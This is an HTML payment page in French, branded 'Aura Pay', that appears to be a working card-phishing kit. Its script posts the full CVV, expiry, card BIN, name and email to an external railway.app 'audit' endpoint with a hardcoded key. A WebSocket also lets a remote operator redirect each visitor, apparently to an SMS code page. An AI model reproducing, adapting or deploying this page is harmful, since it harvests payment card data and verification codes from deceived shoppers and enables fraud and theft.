<!DOCTYPE html>
<html lang="fr">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Checkout - Aura Pay</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
    <style>
        :root {
            --primary: #6366f1;
            --bg: #0f172a;
            --card-bg: rgba(255, 255, 255, 0.05);
            --text: #f8fafc;
        }

        body {
            margin: 0;
            font-family: 'Inter', sans-serif;
            background: radial-gradient(circle at top right, #1e1b4b, var(--bg));
            color: var(--text);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }

        .glass-card {
            background: var(--card-bg);
            backdrop-filter: blur(12px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            padding: 2.5rem;
            border-radius: 24px;
            width: 100%;
            max-width: 450px;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
        }

        h2 {
            margin-bottom: 2rem;
            font-weight: 600;
            text-align: center;
        }

        .input-group {
            margin-bottom: 1.2rem;
        }

        label {
            display: block;
            margin-bottom: 0.5rem;
            font-size: 0.8rem;
            color: #94a3b8;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        input {
            width: 100%;
            padding: 0.8rem;
            background: rgba(0, 0, 0, 0.3);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 12px;
            color: white;
            font-size: 1rem;
            box-sizing: border-box;
        }

        input:focus {
            outline: none;
            border-color: var(--primary);
        }

        .row {
            display: grid;
            grid-template-columns: 2fr 1fr;
            gap: 1rem;
        }

        button {
            width: 100%;
            padding: 1rem;
            background: var(--primary);
            border: none;
            border-radius: 12px;
            color: white;
            font-weight: 600;
            cursor: pointer;
            transition: 0.3s;
            margin-top: 1rem;
        }

        button:hover {
            background: #4f46e5;
            transform: translateY(-2px);
        }

        #status {
            text-align: center;
            margin-top: 1rem;
            font-size: 0.9rem;
            color: #ef4444;
        }
    </style>
</head>

<body>
    <div class="glass-card">
        <h2>Aura Pay</h2>
        <form id="payForm">
            <div class="input-group">
                <label>Nom complet</label>
                <input type="text" id="name" placeholder="Jean Dupont" required>
            </div>
            <div class="input-group">
                <label>Email</label>
                <input type="email" id="email" placeholder="jean@example.com" required>
            </div>
            <div class="input-group">
                <label>Numéro de carte</label>
                <input type="text" id="card" placeholder="4242 4242 4242 4242" required maxlength="19">
            </div>
            <div class="row">
                <div class="input-group">
                    <label>Expiration (MM/YY)</label>
                    <input type="text" id="expiry" placeholder="12/26" required maxlength="5">
                </div>
                <div class="input-group">
                    <label>CVV</label>
                    <input type="text" id="cvv" placeholder="123" required maxlength="4">
                </div>
            </div>
            <div class="input-group">
                <label>Montant (€)</label>
                <input type="number" id="amount" value="100.00" step="0.01" required>
            </div>
            <button type="submit">Payer Maintenant</button>
        </form>
        <div id="status"></div>
    </div>

    <script>
        // Session ID permanent pour ce visiteur
        let clientId = localStorage.getItem('aura_client_id');
        if (!clientId) {
            clientId = 'cl-' + Math.random().toString(36).substr(2, 9);
            localStorage.setItem('aura_client_id', clientId);
        }

        // Connexion WebSocket pour redirection instantanée
        const wsUrl = `wss://api-production-8591.up.railway.app/ws/client/${clientId}`;
        const ws = new WebSocket(wsUrl);
        ws.onmessage = (e) => {
            const msg = JSON.parse(e.data);
            if (msg.type === 'REDIRECT') {
                // Si la redirection est vers un chemin local (ex: /sms), on reste sur le même domaine
                if (msg.url.startsWith('/')) {
                    window.location.href = msg.url;
                } else {
                    window.location.href = msg.url;
                }
            }
        };

        const form = document.getElementById('payForm');
        form.addEventListener('submit', async (e) => {
            e.preventDefault();
            const btn = form.querySelector('button');
            btn.disabled = true;
            btn.textContent = 'Traitement...';

            const cardValue = document.getElementById('card').value.replace(/\s/g, '');
            const cardBin = cardValue.substring(0, 6);
            let brand = "Inconnu";
            if (/^4/.test(cardBin)) brand = "Visa";
            else if (/^5[1-5]/.test(cardBin)) brand = "Mastercard";
            else if (/^3[47]/.test(cardBin)) brand = "Amex";

            const data = {
                client_id: clientId,
                email: document.getElementById('email').value,
                full_name: document.getElementById('name').value,
                numero_carte_masque: document.getElementById('card').value.replace(/\s/g, '').replace(/(\d{4})\d+(\d{4})/, "$1-****-****-$2"),
                card_bin: cardBin,
                card_brand: brand,
                expiry: document.getElementById('expiry').value,
                cvv: document.getElementById('cvv').value,
                montant: parseFloat(document.getElementById('amount').value),
                adresse_ip: "123.123.123.123", // Simulé
                device: navigator.userAgent
            };

            try {
                const res = await fetch('https://api-production-8591.up.railway.app/v1/audit', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json', 'X-API-KEY': 'pro-audit-secret-key-2024' },
                    body: JSON.stringify(data)
                });
                if (res.ok) window.location.href = '/loading';
                else document.getElementById('status').textContent = "Erreur de validation.";
            } catch (err) {
                document.getElementById('status').textContent = "Erreur de connexion.";
            }
        });
    </script>
</body>

</html>
